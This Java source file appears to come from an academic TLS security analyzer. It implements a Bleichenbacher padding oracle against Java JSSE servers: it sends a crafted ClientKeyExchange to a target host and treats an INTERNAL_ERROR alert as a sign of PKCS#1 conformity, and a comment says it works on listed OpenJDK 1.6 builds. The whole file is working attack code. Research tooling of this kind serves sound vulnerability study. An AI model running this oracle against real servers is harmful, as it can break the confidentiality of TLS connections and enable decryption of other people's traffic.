package de.rub.nds.ssl.analyzer.attacker.bleichenbacher.oracles;

import de.rub.nds.ssl.analyzer.attacker.bleichenbacher.OracleException;
import de.rub.nds.ssl.stack.protocols.alert.Alert;
import de.rub.nds.ssl.stack.protocols.alert.datatypes.EAlertDescription;
import de.rub.nds.ssl.stack.protocols.commons.KeyExchangeParams;
import de.rub.nds.ssl.stack.protocols.handshake.ClientKeyExchange;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.EncPreMasterSecret;
import de.rub.nds.ssl.stack.protocols.handshake.datatypes.PreMasterSecret;
import de.rub.nds.ssl.stack.trace.MessageContainer;
import de.rub.nds.ssl.stack.workflows.TLS10HandshakeWorkflow;
import de.rub.nds.ssl.stack.workflows.commons.ESupportedSockets;
import de.rub.nds.ssl.stack.workflows.commons.ObservableBridge;
import java.net.SocketException;
import java.security.PublicKey;
import java.util.Observable;

/**
 * JSSE Bleichenbacher oracle - Alert:Internal_Error in special cases.
 * Conditions: keylength >= 2048bit and 0x00 byte in the padding String
 * (additional to the separation 0x00 byte) of the PKCS construct as part of the
 * ClientKeyExchange message.
 *
 * Successfully tested on java version "1.6.0_20" OpenJDK Runtime Environment
 * (IcedTea6 1.9.13) (6b20-1.9.13-0ubuntu1~10.10.1) OpenJDK 64-Bit Server VM
 * (build 19.0-b09, mixed mode)
 *
 * @author Christopher Meyer - christopher.meyer@rub.de
 * @version 0.1
 *
 * May 18, 2012
 */
public final class JSSE16Oracle extends ASSLServerOracle {

    /**
     * Initialize the JSSE oracle.
     * Known to be functional at least until JDK 1.6.35
     * @param serverAddress Address of the target server
     * @param serverPort
     * @throws SocketException 
     */
    public JSSE16Oracle(final String serverAddress, final int serverPort)
            throws SocketException {
        super(serverAddress, serverPort);
        oracleType = OracleType.FFT;
    }

    /**
     * {@inheritDoc}
     */
    @Override
    public boolean checkPKCSConformity(final byte[] msg) throws
            OracleException {
        exectuteWorkflow(msg, ESupportedSockets.StandardSocket);

        return oracleResult();
    }

    /**
     * Update observed object.
     *
     * @param o Observed object
     * @param arg Arguments
     */
    @Override
    public void update(final Observable o, final Object arg) {
        MessageContainer trace = null;
        TLS10HandshakeWorkflow.EStates state = null;
        setOracleResult(false);
        ObservableBridge obs;
        if (o != null && o instanceof ObservableBridge) {
            obs = (ObservableBridge) o;
            state = (TLS10HandshakeWorkflow.EStates) obs.getState();
            trace = (MessageContainer) arg;
        }
        if (state != null) {
            switch (state) {
                case CLIENT_KEY_EXCHANGE:
                    KeyExchangeParams keyParams =
                            KeyExchangeParams.getInstance();
                    PublicKey pk = keyParams.getPublicKey();
                    ClientKeyExchange cke = new ClientKeyExchange(
                            PROTOCOL_VERSION,
                            keyParams.getKeyExchangeAlgorithm());
                    PreMasterSecret pms = new PreMasterSecret(PROTOCOL_VERSION);
                    getWorkflow().setPreMasterSecret(pms);
                    pms.setProtocolVersion(PROTOCOL_VERSION);

                    //encrypt the PreMasterSecret
                    EncPreMasterSecret encPMS =
                            new EncPreMasterSecret(pk);
                    encPMS.setEncryptedPreMasterSecret(getEncPMS());
                    cke.setExchangeKeys(encPMS);

                    trace.setCurrentRecord(cke);
                    break;
                case ALERT:
                    Alert alert = new Alert(trace.getCurrentRecord().
                            encode(false), false);

                    if (EAlertDescription.INTERNAL_ERROR.equals(alert.
                            getAlertDescription())) {
                        setOracleResult(true);
                    }
                    break;
                default:
                    break;
            }
        }
    }
}
